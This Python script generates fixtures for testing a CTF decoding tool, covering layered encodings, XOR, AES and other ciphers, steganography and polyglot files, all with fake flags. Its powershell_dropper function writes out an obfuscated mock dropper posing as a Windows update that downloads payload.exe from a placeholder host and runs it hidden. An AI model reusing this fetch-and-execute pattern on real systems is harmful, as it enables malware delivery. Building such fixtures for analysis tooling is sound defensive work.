"""Generate the test fixtures in tests/fixtures/ (run: make fixtures).

Every fixture mirrors a real challenge shape, built with known keys and fake flags.
The output is deterministic (fixed seed), so re-running it changes nothing.
Never put real challenge flags here.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import io
import random
import struct
import zipfile
import zlib
from pathlib import Path

from Crypto.Cipher import AES, ChaCha20
from Crypto.Util.Padding import pad

FIXTURES = Path(__file__).parent / "fixtures"
RNG = random.Random(1337)  # fixed seed: same bytes every time


def write(name: str, data: bytes | str) -> None:
    path = FIXTURES / name
    path.write_bytes(data.encode("utf-8") if isinstance(data, str) else data)
    print(f"  {name:32} {path.stat().st_size} bytes")


def evp_bytes_to_key(
    password: bytes, salt: bytes, key_len: int, iv_len: int
) -> tuple[bytes, bytes]:
    """openssl's legacy KDF (MD5, 1 iteration): D_i = MD5(D_{i-1} || password || salt)."""
    derived = b""
    block = b""
    while len(derived) < key_len + iv_len:
        block = hashlib.md5(block + password + salt).digest()
        derived += block
    return derived[:key_len], derived[key_len : key_len + iv_len]


def tiny_png() -> bytes:
    """A valid 1x1 black PNG, built by hand (signature + IHDR + IDAT + IEND)."""

    def chunk(kind: bytes, body: bytes) -> bytes:
        crc = zlib.crc32(kind + body)
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", crc)

    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)
    idat = zlib.compress(b"\x00\x00")
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


def small_zip(name: str, content: bytes) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        info = zipfile.ZipInfo(name, date_time=(2024, 1, 1, 0, 0, 0))
        info.compress_type = zipfile.ZIP_DEFLATED  # ZipInfo defaults to "stored"
        archive.writestr(info, content)
    return buffer.getvalue()


def hide_zero_width(cover: str, secret: bytes) -> str:
    """Hide `secret` as bits: U+200B = 0, U+200C = 1, inserted after the first word."""
    bits = "".join(f"{byte:08b}" for byte in secret)
    hidden = "".join("​" if bit == "0" else "‌" for bit in bits)
    first, rest = cover.split(" ", 1)
    return first + hidden + " " + rest


ENGLISH = (
    "This is a secret message for the team. The meeting is moved to Friday night, "
    "bring the usual equipment and do not talk about it on the phone. "
    "Remember that the password for the server is written on the back of the old "
    "notebook. When you read this, the flag is CYBN{fixture_xor_repeating}. "
)


def xor(data: bytes, key: bytes) -> bytes:
    """Repeating-key XOR (written here independently of ctfc, to test it)."""
    return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(data))


def cbc_cts_encrypt(plain: bytes, key: bytes, iv: bytes) -> bytes:
    """AES-CBC with ciphertext stealing, CS1 layout (what `openssl -cts` produces).

    Written independently of ctfc on purpose: the test must not check the code
    against itself. Verified against `openssl enc -aes-128-cbc-cts`.
    """
    tail = len(plain) % 16
    if tail == 0:
        return AES.new(key, AES.MODE_CBC, iv).encrypt(plain)
    full = AES.new(key, AES.MODE_CBC, iv).encrypt(plain[: len(plain) - tail])
    last_full = full[-16:]
    stolen = plain[len(plain) - tail :] + bytes(16 - tail)
    stolen_xor = bytes(a ^ b for a, b in zip(last_full, stolen, strict=True))
    final = AES.new(key, AES.MODE_ECB).encrypt(stolen_xor)
    # CS1: the truncated block comes first, the full one last.
    return full[:-16] + last_full[:tail] + final


def fernet_token(key: bytes, message: bytes, timestamp: int) -> bytes:
    """Build a Fernet token by hand: version | timestamp | iv | AES-128-CBC | HMAC."""
    iv = hashlib.sha256(message).digest()[:16]  # deterministic, any IV works
    body = AES.new(key[16:], AES.MODE_CBC, iv).encrypt(pad(message, 16))
    parts = b"\x80" + timestamp.to_bytes(8, "big") + iv + body
    return base64.urlsafe_b64encode(parts + hmac.new(key[:16], parts, hashlib.sha256).digest())


def xtea_encrypt_block(block: bytes, key: bytes, endian: str = "big") -> bytes:
    """One XTEA block, written here from the published algorithm (32 rounds)."""
    fmt = ">" if endian == "big" else "<"
    mask, delta = 0xFFFFFFFF, 0x9E3779B9
    v0, v1 = struct.unpack(fmt + "II", block)
    words = struct.unpack(fmt + "4I", key)
    total = 0
    for _ in range(32):
        v0 = (v0 + (((((v1 << 4) ^ (v1 >> 5)) & mask) + v1) ^ (total + words[total & 3]))) & mask
        total = (total + delta) & mask
        v1 = (
            v1 + (((((v0 << 4) ^ (v0 >> 5)) & mask) + v0) ^ (total + words[(total >> 11) & 3]))
        ) & mask
    return struct.pack(fmt + "II", v0, v1)


def powershell_dropper() -> str:
    """A fake PowerShell dropper whose strings are hidden with a single-byte XOR (0x5A)."""

    def hidden(text: str) -> str:
        return ",".join(f"0x{ord(char) ^ 0x5A:02x}" for char in text)

    url = "http://update.example.invalid/payload.exe"
    flag = "CYBN{fixture_powershell_layers}"
    return (
        "# Windows update helper - do not remove\n"
        "$k = 0x5A\n"
        "function Decode-String($bytes) {\n"
        "    return -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })\n"
        "}\n"
        f"$url = Decode-String @({hidden(url)})\n"
        f"$tag = Decode-String @({hidden(flag)})\n"
        "$client = New-Object System.Net.WebClient\n"
        '$path = Join-Path $env:TEMP "update.exe"\n'
        "$client.DownloadFile($url, $path)\n"
        "Start-Process -FilePath $path -WindowStyle Hidden\n"
        'Write-Output "Update finished, please restart the computer when you can."\n'
    )


def main() -> None:
    FIXTURES.mkdir(exist_ok=True)
    print(f"writing fixtures to {FIXTURES}")

    # Multi-layer encoding: text -> hex -> zlib -> base64
    text = b"Good job, the flag is CYBN{fixture_layers_b64_zlib_hex}"
    write("layers_b64_zlib_hex.txt", base64.b64encode(zlib.compress(text.hex().encode())))

    # Reversed base64 (PowerShell droppers love this)
    write("reversed_b64.txt", base64.b64encode(b"CYBN{fixture_reversed}")[::-1])

    # PowerShell -EncodedCommand: base64 of UTF-16LE
    command = "Write-Host 'CYBN{fixture_encodedcommand}'"
    encoded = base64.b64encode(command.encode("utf-16-le")).decode()
    write("powershell_encoded.txt", f"powershell.exe -NoP -W Hidden -enc {encoded}\n")

    # AES-ECB with repeated plaintext blocks
    key = RNG.randbytes(16)
    plaintext = b"YELLOW SUBMARINE" * 4 + b"CYBN{fixture_ecb_mode_leaks}"
    write("aes_ecb_repeated.bin", AES.new(key, AES.MODE_ECB).encrypt(pad(plaintext, 16)))

    # openssl enc -aes-256-cbc -md md5 (legacy KDF), raw and base64 versions
    salt = RNG.randbytes(8)
    key, iv = evp_bytes_to_key(b"password123", salt, 32, 16)
    secret = b"CYBN{fixture_openssl_md5}\n"
    blob = b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16))
    write("openssl_salted_md5.bin", blob)
    write("openssl_salted_md5.b64", base64.b64encode(blob) + b"\n")

    # PNG with a ZIP appended after IEND (polyglot)
    archive = small_zip("flag.txt", b"CYBN{fixture_polyglot_zip}")
    write("png_with_zip.png", tiny_png() + archive)

    # Zero-width steganography in normal text
    cover = "Nothing to see here, just a normal sentence about the weather."
    write("zero_width.txt", hide_zero_width(cover, b"CYBN{zero_width}"))

    # Binary with crypto constants: TEA delta (LE) and the AES S-box
    sbox_start = bytes.fromhex("637c777bf26b6fc53001672bfed7ab76")
    binary = RNG.randbytes(300) + struct.pack("<I", 0x9E3779B9) + RNG.randbytes(200)
    write("crypto_constants.bin", binary + sbox_start + RNG.randbytes(100))

    # Repeating-key XOR of English text (key length 6)
    xor_key = b"x0rK3y"
    xored = bytes(byte ^ xor_key[i % len(xor_key)] for i, byte in enumerate(ENGLISH.encode()))
    write("xor_repeating.bin", xored)

    # --- XOR (M2) ---
    write("xor_single_byte.bin", xor(ENGLISH.encode(), b"\x5a"))
    # Two layers: repeating key "secret", then the single byte 0x42
    write("xor_two_layers.bin", xor(xor(ENGLISH.encode(), b"secret"), b"\x42"))
    # A PNG file XORed with a 4-byte key: the PNG header is the known plaintext
    write("xor_png.bin", xor(tiny_png() + RNG.randbytes(64), b"k3y!"))
    # Multi-layer: text -> XOR -> zlib -> base64 (decode: base64, zlib, XOR)
    layered = xor(ENGLISH.replace("xor_repeating", "multi_layer").encode(), b"K3y!")
    write("layers_b64_zlib_xor.txt", base64.b64encode(zlib.compress(layered)) + b"\n")
    # PowerShell dropper: strings XORed with 0x5A inside, whole script XORed
    # with a repeating key, then base64
    script = powershell_dropper().encode()
    write("powershell_xor.b64", base64.b64encode(xor(script, b"Upd4t3r!")) + b"\n")
    # Two messages encrypted with the same key stream (two-time pad)
    stream = RNG.randbytes(80)
    write(
        "two_time_pad_1.bin", xor(b"Meet the courier at the train station tonight at nine.", stream)
    )
    write("two_time_pad_2.bin", xor(b"The password for the archive is written on the map.", stream))
    # Too short for statistics: only the crib "CYBN{" can break it (key length 5)
    short = b"Here is what you wanted: CYBN{crib_dragging_works} bye"
    write("xor_short_crib.bin", xor(short, b"Qx7#9"))

    # --- symmetric ciphers (M3) ---
    # 48-byte key||iv blob (AES-256-CBC): the blob, and a ciphertext made with it
    blob = RNG.randbytes(48)
    write("key_iv_blob.b64", base64.b64encode(blob) + b"\n")
    message = (
        b"The archive password is hunter2 and the flag is CYBN{fixture_key_iv_blob}. "
        b"Do not write it down anywhere else, please."
    )
    write(
        "aes_cbc_keyiv_blob.bin",
        AES.new(blob[:32], AES.MODE_CBC, blob[32:]).encrypt(pad(message, 16)),
    )

    # AES-256-CBC with the IV prepended to the ciphertext (the most common layout)
    key = RNG.randbytes(32)
    iv = RNG.randbytes(16)
    secret = b"CYBN{fixture_iv_prefixed} the rest of this sentence is only here as filler."
    write("aes_cbc_iv_prefix.bin", iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16)))
    write("aes_cbc_iv_prefix.key", key.hex() + "\n")

    # AES-256-GCM as nonce || ciphertext || tag (what most Python snippets write out)
    nonce = RNG.randbytes(12)
    gcm = AES.new(key, AES.MODE_GCM, nonce=nonce)
    body, tag = gcm.encrypt_and_digest(b"CYBN{fixture_gcm_nonce_ct_tag}")
    write("aes_gcm_nonce_ct_tag.bin", nonce + body + tag)

    # AES-128-CBC with ciphertext stealing (CS1, what openssl's -cts does): the
    # plaintext length is not a multiple of 16 and no padding was added
    cts_key = RNG.randbytes(16)
    cts_iv = RNG.randbytes(16)
    cts_plain = b"CYBN{fixture_cts_mode} short tail here"  # 38 bytes = 2 blocks + 6
    write("aes_cbc_cts.bin", cts_iv + cbc_cts_encrypt(cts_plain, cts_key, cts_iv))
    write("aes_cbc_cts.key", cts_key.hex() + "\n")

    # openssl enc with the modern KDF: -aes-256-cbc -pbkdf2 -iter 10000 -md sha256
    salt = RNG.randbytes(8)
    raw = hashlib.pbkdf2_hmac("sha256", b"infected", salt, 10000, 48)
    padded = pad(b"CYBN{fixture_openssl_pbkdf2}\n", 16)
    body = AES.new(raw[:32], AES.MODE_CBC, raw[32:]).encrypt(padded)
    write("openssl_salted_pbkdf2.bin", b"Salted__" + salt + body)

    # A Fernet token (built by hand, so the `cryptography` package is not needed)
    fernet_key = RNG.randbytes(32)
    write("fernet_key.b64", base64.urlsafe_b64encode(fernet_key) + b"\n")
    write("fernet_token.txt", fernet_token(fernet_key, b"CYBN{fixture_fernet}", 1700000000) + b"\n")

    # ChaCha20 with a 12-byte nonce prepended to the ciphertext
    chacha_key = RNG.randbytes(32)
    chacha_nonce = RNG.randbytes(12)
    stream_cipher = ChaCha20.new(key=chacha_key, nonce=chacha_nonce)
    write(
        "chacha20_nonce_prefix.bin",
        chacha_nonce + stream_cipher.encrypt(b"CYBN{fixture_chacha20} and some filler text here."),
    )
    write("chacha20_nonce_prefix.key", chacha_key.hex() + "\n")

    # XTEA-CBC, big-endian words, PKCS7 padding, 16-byte key from a passphrase
    xtea_key = hashlib.md5(b"tiny").digest()
    xtea_iv = RNG.randbytes(8)
    xtea_plain = pad(b"CYBN{fixture_xtea_cbc} delta is 0x9e3779b9", 8)
    blocks = b""
    previous = xtea_iv
    for offset in range(0, len(xtea_plain), 8):
        chunk = xtea_plain[offset : offset + 8]
        block = bytes(a ^ b for a, b in zip(chunk, previous, strict=True))
        previous = xtea_encrypt_block(block, xtea_key, "big")
        blocks += previous
    write("xtea_cbc.bin", xtea_iv + blocks)

    # Text formats recognised by prefix
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=")
    payload = base64.urlsafe_b64encode(b'{"user":"admin"}').rstrip(b"=")
    write("jwt.txt", header + b"." + payload + b".c2lnbmF0dXJl\n")
    salt_hex = RNG.randbytes(20).hex()
    response_hex = RNG.randbytes(20).hex()
    write("mysqlna_hash.txt", f"$mysqlna${salt_hex}*{response_hex}\n")


if __name__ == "__main__":
    main()
